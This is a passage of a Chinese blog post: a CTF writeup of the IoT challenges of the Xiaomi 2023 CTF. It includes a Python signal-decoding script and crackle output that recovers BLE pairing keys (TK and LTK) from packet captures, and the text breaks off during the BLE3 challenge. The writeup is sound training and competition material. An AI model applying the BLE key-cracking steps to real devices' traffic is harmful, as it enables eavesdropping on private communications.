<!doctype html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Rspress v1.15.0"><title data-rh="true">小米2023CTF安全赛道writeup - SumyBlog</title><meta data-rh="true" name="description" content="SumyGG&#x27;s Blog"/><meta data-rh="true" name="referrer" content="no-referrer-when-downgrade"/><link data-rh="true" rel="alternate" type="application/rss+xml" href="https://sumygg.com/rss/feed.rss"/>
<script id="check-dark-light">
;(() => {
  const saved = localStorage.getItem('rspress-theme-appearance')
  const prefereDark = window.matchMedia('(prefers-color-scheme: dark)').matches
  if (!saved || saved === 'auto' ? prefereDark : saved === 'dark') {
    document.documentElement.classList.add('dark')
  }
})()
</script>
<title>SumyBlog</title><link rel="icon" href="/favicon.ico"><script defer="defer" src="/static/js/styles.df47b71a.js"></script><script defer="defer" src="/static/js/lib-lodash.b329996d.js"></script><script defer="defer" src="/static/js/lib-polyfill.6c0e3b15.js"></script><script defer="defer" src="/static/js/lib-react.1a4d633b.js"></script><script defer="defer" src="/static/js/lib-router.345150bc.js"></script><script defer="defer" src="/static/js/4051.e82f0025.js"></script><script defer="defer" src="/static/js/index.e31e71f4.js"></script><link href="/static/css/styles.fb4df59b.css" rel="stylesheet"><script async src="https://www.googletagmanager.com/gtag/js?id=G-2NDCXW15G4"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-2NDCXW15G4")</script><link href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css" rel="stylesheet" integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV" crossorigin="anonymous"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" crossorigin="anonymous"></script></head><body ><div id="root"><div><div><div class="navContainer_f6cde sticky rspress-nav px-6 "><div class="container_f6cde flex justify-between items-center h-full"><div class="navBarTitle_f6cde"><a href="/" class="flex items-center w-full h-full text-base font-semibold transition-opacity duration-300 hover:opacity-60"><span>SumyBlog</span></a></div><div class="undefined flex flex-1 justify-end items-center"><div class="rightNav_f6cde"><div class="flex sm:flex-1 items-center sm:pl-4 sm:pr-2"><div class="rspress-nav-search-button navSearchButton_6e282"><button><svg width="18" height="18" viewBox="0 0 32 32"><path fill="var(--rp-c-gray)" d="m29 27.586-7.552-7.552a11.018 11.018 0 1 0-1.414 1.414L27.586 29ZM4 13a9 9 0 1 1 9 9 9.01 9.01 0 0 1-9-9Z"></path></svg><p class="searchWord_6e282">搜索...</p><div style="opacity:0"><span></span><span>K</span></div></button></div><div class="mobileNavSearchButton_6e282"><svg width="24" height="24" viewBox="0 0 32 32"><path fill="var(--rp-c-gray)" d="m29 27.586-7.552-7.552a11.018 11.018 0 1 0-1.414 1.414L27.586 29ZM4 13a9 9 0 1 1 9 9 9.01 9.01 0 0 1-9-9Z"></path></svg></div></div><div class="rspress-nav-menu menu h-14"><a class="link_03735  cursor-pointer" target="" href="/blog/flinks/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">友情链接</div></a><a class="link_03735  cursor-pointer" target="" href="/blog/archives/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">归档</div></a><a class="link_03735  cursor-pointer" target="" href="/blog/categories/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">分类</div></a><a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">标签</div></a><a class="link_03735  cursor-pointer" target="" href="/about/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">关于我</div></a></div><div class="flex-center flex-row"><div class="mx-2"><div class="md:mr-2 rspress-nav-appearance"><div class="p-1 border border-solid border-gray-300 text-gray-400  cursor-pointer rounded-md hover:border-gray-600 hover:text-gray-600 dark:hover:border-gray-200 dark:hover:text-gray-200 transition-all duration-300"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 18c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6zm0-10c-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4-1.8-4-4-4zM12 4c-.6 0-1-.4-1-1V1c0-.6.4-1 1-1s1 .4 1 1v2c0 .6-.4 1-1 1zM12 24c-.6 0-1-.4-1-1v-2c0-.6.4-1 1-1s1 .4 1 1v2c0 .6-.4 1-1 1zM5.6 6.6c-.3 0-.5-.1-.7-.3L3.5 4.9c-.4-.4-.4-1 0-1.4s1-.4 1.4 0l1.4 1.4c.4.4.4 1 0 1.4-.1.2-.4.3-.7.3zM19.8 20.8c-.3 0-.5-.1-.7-.3l-1.4-1.4c-.4-.4-.4-1 0-1.4s1-.4 1.4 0l1.4 1.4c.4.4.4 1 0 1.4-.2.2-.5.3-.7.3zM3 13H1c-.6 0-1-.4-1-1s.4-1 1-1h2c.6 0 1 .4 1 1s-.4 1-1 1zM23 13h-2c-.6 0-1-.4-1-1s.4-1 1-1h2c.6 0 1 .4 1 1s-.4 1-1 1zM4.2 20.8c-.3 0-.5-.1-.7-.3-.4-.4-.4-1 0-1.4l1.4-1.4c.4-.4 1-.4 1.4 0s.4 1 0 1.4l-1.4 1.4c-.2.2-.4.3-.7.3zM18.4 6.6c-.3 0-.5-.1-.7-.3-.4-.4-.4-1 0-1.4l1.4-1.4c.4-.4 1-.4 1.4 0s.4 1 0 1.4l-1.4 1.4c-.2.2-.5.3-.7.3z"></path></svg></div></div></div><div class="social-links menu-item_93d67 flex-center relative"><div class="flex-center h-full gap-x-4 transition-colors duration-300 md:mr-2"><a href="https://github.com/sumy7/" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></div></a><a href="https://weibo.com/sumy7" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="iconify iconify--ri" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><path fill="currentColor" d="M17.525 11.378c1.263.392 2.669 1.336 2.669 3.004c0 2.763-3.98 6.239-9.964 6.239c-4.565 0-9.23-2.213-9.23-5.852c0-1.902 1.204-4.102 3.277-6.177c2.773-2.77 6.004-4.033 7.219-2.816c.537.537.588 1.464.244 2.572c-.178.557.525.25.525.25c2.24-.938 4.196-.994 4.909.027c.38.543.343 1.306-.008 2.19c-.163.407.048.471.36.563zm-7.282 7.939c3.641-.362 6.401-2.592 6.167-4.983c-.237-2.391-3.382-4.038-7.023-3.677c-3.64.36-6.403 2.59-6.167 4.98c.237 2.394 3.382 4.039 7.023 3.68zM6.16 14.438c.754-1.527 2.712-2.39 4.446-1.94c1.793.463 2.707 2.154 1.976 3.8c-.744 1.682-2.882 2.578-4.695 1.993c-1.752-.566-2.493-2.294-1.727-3.853zm1.446 2.587c.568.257 1.325.013 1.676-.55c.346-.568.163-1.217-.407-1.459c-.563-.237-1.291.008-1.64.553c-.354.547-.189 1.202.371 1.456zm2.206-1.808c.219.092.501-.012.628-.231c.123-.22.044-.466-.178-.548c-.216-.084-.486.018-.613.232c-.123.214-.054.458.163.547zM19.873 9.5a.725.725 0 1 1-1.378-.451a1.38 1.38 0 0 0-.288-1.357a1.395 1.395 0 0 0-1.321-.425a.723.723 0 1 1-.303-1.416a2.836 2.836 0 0 1 3.29 3.649zm-3.916-6.575A5.831 5.831 0 0 1 21.5 4.72a5.836 5.836 0 0 1 1.22 5.704a.838.838 0 0 1-1.06.54a.844.844 0 0 1-.542-1.062a4.143 4.143 0 0 0-4.807-5.327a.845.845 0 0 1-.354-1.65z"></path></svg></div></a><a href="https://twitter.com/sumygg" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"></path></svg></div></a></div><div class="md:ml-1 p-2"><svg width="1em" height="1em" viewBox="0 0 32 32"><path fill="currentColor" d="M16 22 6 12l1.4-1.4 8.6 8.6 8.6-8.6L26 12z"></path></svg></div></div></div></div><div class="mobileNavMenu_f6cde"><div class="navScreen_457e8 " id="navScreen"><div class="container_457e8"><div class="navMenu_457e8"><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/blog/flinks/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">友情链接</div></a></div><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/blog/archives/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">归档</div></a></div><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/blog/categories/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">分类</div></a></div><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">标签</div></a></div><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/about/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">关于我</div></a></div></div><div class="flex-center flex-col gap-2"><div class="mt-2 navAppearance_457e8 flex justify-center"></div><div class="social-links menu-item_93d67 flex-center relative"><div class="flex-center h-full gap-x-4 transition-colors duration-300 md:mr-2"><a href="https://github.com/sumy7/" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></div></a><a href="https://weibo.com/sumy7" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="iconify iconify--ri" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><path fill="currentColor" d="M17.525 11.378c1.263.392 2.669 1.336 2.669 3.004c0 2.763-3.98 6.239-9.964 6.239c-4.565 0-9.23-2.213-9.23-5.852c0-1.902 1.204-4.102 3.277-6.177c2.773-2.77 6.004-4.033 7.219-2.816c.537.537.588 1.464.244 2.572c-.178.557.525.25.525.25c2.24-.938 4.196-.994 4.909.027c.38.543.343 1.306-.008 2.19c-.163.407.048.471.36.563zm-7.282 7.939c3.641-.362 6.401-2.592 6.167-4.983c-.237-2.391-3.382-4.038-7.023-3.677c-3.64.36-6.403 2.59-6.167 4.98c.237 2.394 3.382 4.039 7.023 3.68zM6.16 14.438c.754-1.527 2.712-2.39 4.446-1.94c1.793.463 2.707 2.154 1.976 3.8c-.744 1.682-2.882 2.578-4.695 1.993c-1.752-.566-2.493-2.294-1.727-3.853zm1.446 2.587c.568.257 1.325.013 1.676-.55c.346-.568.163-1.217-.407-1.459c-.563-.237-1.291.008-1.64.553c-.354.547-.189 1.202.371 1.456zm2.206-1.808c.219.092.501-.012.628-.231c.123-.22.044-.466-.178-.548c-.216-.084-.486.018-.613.232c-.123.214-.054.458.163.547zM19.873 9.5a.725.725 0 1 1-1.378-.451a1.38 1.38 0 0 0-.288-1.357a1.395 1.395 0 0 0-1.321-.425a.723.723 0 1 1-.303-1.416a2.836 2.836 0 0 1 3.29 3.649zm-3.916-6.575A5.831 5.831 0 0 1 21.5 4.72a5.836 5.836 0 0 1 1.22 5.704a.838.838 0 0 1-1.06.54a.844.844 0 0 1-.542-1.062a4.143 4.143 0 0 0-4.807-5.327a.845.845 0 0 1-.354-1.65z"></path></svg></div></a><a href="https://twitter.com/sumygg" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"></path></svg></div></a></div><div class="md:ml-1 p-2"><svg width="1em" height="1em" viewBox="0 0 32 32"><path fill="currentColor" d="M16 22 6 12l1.4-1.4 8.6 8.6 8.6-8.6L26 12z"></path></svg></div></div></div></div></div><button aria-label="mobile hamburger" class=" navHamburger_e7b06 text-gray-500"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" fill="currentColor"><circle cx="8" cy="16" r="2" fill="currentColor"></circle><circle cx="16" cy="16" r="2" fill="currentColor"></circle><circle cx="24" cy="16" r="2" fill="currentColor"></circle></svg></button></div></div></div></div><section><div class="docLayout_edeb4 pt-0"><div class="content_edeb4 rspress-doc-container flex flex-shrink-0 mx-auto"><div class="w-full flex-1"><div><div class="rspress-doc"><!--$--><h1 id="小米2023ctf安全赛道writeup" class="text-3xl mb-10 leading-10 tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#小米2023ctf安全赛道writeup">#</a>小米2023CTF安全赛道writeup</h1><div class="postInfoContainer_07bfd -mt-5 mb-8"><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V5h16V4H0V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <!-- -->2023-05-06</span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.825a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31L.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3zm-8.322.12C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <a class="link_03735  cursor-pointer" target="" href="/blog/categories/index.html?category=CTF">CTF</a></span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M2 1a1 1 0 0 0-1 1v4.586a1 1 0 0 0 .293.707l7 7a1 1 0 0 0 1.414 0l4.586-4.586a1 1 0 0 0 0-1.414l-7-7A1 1 0 0 0 6.586 1H2zm4 3.5a1.5 1.5 0 1 1-3 0a1.5 1.5 0 0 1 3 0z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html?tag=CTF">CTF</a></span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M2 1a1 1 0 0 0-1 1v4.586a1 1 0 0 0 .293.707l7 7a1 1 0 0 0 1.414 0l4.586-4.586a1 1 0 0 0 0-1.414l-7-7A1 1 0 0 0 6.586 1H2zm4 3.5a1.5 1.5 0 1 1-3 0a1.5 1.5 0 0 1 3 0z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html?tag=writeup">writeup</a></span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M9.293 0H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V4.707A1 1 0 0 0 13.707 4L10 .293A1 1 0 0 0 9.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 0 1-1-1zM5.485 6.879l1.036 4.144l.997-3.655a.5.5 0 0 1 .964 0l.997 3.655l1.036-4.144a.5.5 0 0 1 .97.242l-1.5 6a.5.5 0 0 1-.967.01L8 9.402l-1.018 3.73a.5.5 0 0 1-.967-.01l-1.5-6a.5.5 0 1 1 .97-.242z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <!-- -->5.1k<!-- --> 字</span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 3.5a.5.5 0 0 0-1 0V9a.5.5 0 0 0 .252.434l3.5 2a.5.5 0 0 0 .496-.868L8 8.71V3.5z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <!-- -->16<!-- --> 分钟</span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;g fill=\&quot;currentColor\&quot;&gt;&lt;path d=\&quot;M10.5 8a2.5 2.5 0 1 1-5 0a2.5 2.5 0 0 1 5 0z\&quot;/&gt;&lt;path d=\&quot;M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7a3.5 3.5 0 0 0 0 7z\&quot;/&gt;&lt;/g&gt;&quot;}" inline="true"></iconify-icon> </span></div>
<blockquote class="border-l-2 border-solid border-divider pl-4 my-6 transition-colors duration-500 blockquote_3b154">
<p class="my-4 leading-7">又是一年小米CTF，这次稍微卷了卷，拿到了第三名。奖品是一个小米手表（感觉没有去年好，23333）。但是有超多的证书和奖杯（有三个！！！）</p>
</blockquote>
<h2 id="iot" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot">#</a>IoT</h2>
<h3 id="iot-1-cyber-pulse" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot-1-cyber-pulse">#</a>IoT-1 Cyber Pulse</h3>
<blockquote class="border-l-2 border-solid border-divider pl-4 my-6 transition-colors duration-500 blockquote_3b154">
<p class="my-4 leading-7">想不到居然是个原题。。。<a target="_blank" rel="noopener noreferrer" href="https://ctftime.org/writeup/34125" class="link-_707cf  link_3b154 inline-link_3b154">https://ctftime.org/writeup/34125</a></p>
</blockquote>
<p class="my-4 leading-7">先用Logic2打开文件，然后导出为csv格式</p>
<p class="my-4 leading-7"><img alt="Logic2" src="/static/image/iot-1-1.dbc061db.png"/></p>
<p class="my-4 leading-7">写个程序分析一下分布</p>
<p class="my-4 leading-7"><img alt="分布图" src="/static/image/iot-1-2.626e3501.png"/></p>
<p class="my-4 leading-7">最后输出flag</p>
<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import numpy as np
</span></span><span style="display:block;padding:0 1.25rem">from matplotlib import pyplot as plt
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">sig = np.genfromtxt(&#x27;digital.csv&#x27;, delimiter=&#x27;,&#x27;, skip_header=0)
</span><span style="display:block;padding:0 1.25rem">values = np.diff(sig[:, 0]) * 1000
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">plt.figure()
</span><span style="display:block;padding:0 1.25rem">plt.plot(values[2:-1])
</span><span style="display:block;padding:0 1.25rem">plt.savefig(&#x27;signal_plot.png&#x27;)
</span><span style="display:block;padding:0 1.25rem">plt.close()
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">rounded_values = np.round(values[::2])
</span><span style="display:block;padding:0 1.25rem">int_values = np.floor(values[::2])
</span><span style="display:block;padding:0 1.25rem">ceil_values = int_values + 1
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">for v in [rounded_values, int_values, ceil_values]:
</span><span style="display:block;padding:0 1.25rem">    print(&#x27;&#x27;.join([chr(int(x)) for x in v[1:]]))</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7"><img alt="结果" src="/static/image/iot-1-3.e1ccd7e9.png"/></p>
<h3 id="iot-2-debug" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot-2-debug">#</a>IoT-2 Debug</h3>
<p class="my-4 leading-7">hint给了提示，解压sal文件，从json里搜索，找到了saleae公司下的Logic2软件可以打开该文件。</p>
<p class="my-4 leading-7">用该软件分析数据，拼接字符串得到flag。</p>
<p class="my-4 leading-7"><img alt="Logic2" src="/static/image/iot-2-1.a245511c.png"/></p>
<h3 id="iot-3-pcb" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot-3-pcb">#</a>IoT-3 PCB</h3>
<p class="my-4 leading-7">找软件找了好久。。。群里大佬提示了一个【嘉立创CAM】（吐槽一下居然还要手机验证码登录），找了个Windows电脑安装了一下，载入zip压缩包。在三个图层里有flag信息。（从0开始的PCB入门）</p>
<p class="my-4 leading-7"><img alt="嘉立创CAM" src="/static/image/iot-3-1.d05193b4.png"/></p>
<h3 id="iot-4-ble1" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot-4-ble1">#</a>IoT-4 BLE1</h3>
<p class="my-4 leading-7">找到低功耗蓝牙的LTK。使用工具破解即可。<a target="_blank" rel="noopener noreferrer" href="https://github.com/mikeryan/crackle" class="link-_707cf  link_3b154 inline-link_3b154">https://github.com/mikeryan/crackle</a></p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span># sumy @ SumyDeMBP in ~/Downloads
</span></span><span style="display:block;padding:0 1.25rem">$ crackle -i BLE01.pcapng
</span><span style="display:block;padding:0 1.25rem">Warning: No output file specified. Decrypted packets will be lost to the ether.
</span><span style="display:block;padding:0 1.25rem">Found 1 connection
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">Analyzing connection 0:
</span><span style="display:block;padding:0 1.25rem">  62:1f:33:cb:c4:c2 (random) -&gt; 98:22:ef:20:9f:53 (public)
</span><span style="display:block;padding:0 1.25rem">  Found 28 encrypted packets
</span><span style="display:block;padding:0 1.25rem">  Cracking with strategy 0, 20 bits of entropy
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">  !!!
</span><span style="display:block;padding:0 1.25rem">  TK found: 338467
</span><span style="display:block;padding:0 1.25rem">  !!!
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">  Decrypted 26 packets
</span><span style="display:block;padding:0 1.25rem">  LTK found: f39372ca0af932321a6690566c898cd9
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">Specify an output file with -o to decrypt packets!</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="iot-5-ble3" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot-5-ble3">#</a>IoT-5 BLE3</h3>
<p class="my-4 leading-7">这个题确实不难，就是工具没找到，卡了好久。</p>
<p class="my-4 leading-7">用wireshark打开数据包文件，过滤条件输入btatt，首先看发送的基本信息。枚举BLE的handler，不停读取其中的信息，看到了一个里面有假的flag，提交上去肯定不是。</p>
<p class="my-4 leading-7"><img alt="wireshark" src="/static/image/iot-5-1.2525a303.png"/></p>
<p class="my-4 leading-7">btatt里没有有用的信息，看了下外面其余信息，发现文件最后有一段配对交换和加密传输的过程。开始考虑怎么解密这个数据包。</p>
<p class="my-4 leading-7">============================卡了好久分割线====================</p>
<p class="my-4 leading-7">继续使用crackle解密，发现不支持。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>$ crackle -i BLE03.pcapng
</span></span><span style="display:block;padding:0 1.25rem">Warning: No output file specified. Decrypted packets will be lost to the ether.
</span><span style="display:block;padding:0 1.25rem">Frames inside PCAP file not supported ! dlt_name=BLUETOOTH_LE_LL
</span><span style="display:block;padding:0 1.25rem">Frames format supported:
</span><span style="display:block;padding:0 1.25rem"> [256] BLUETOOTH_LE_LL_WITH_PHDR
</span><span style="display:block;padding:0 1.25rem"> [192] PPI
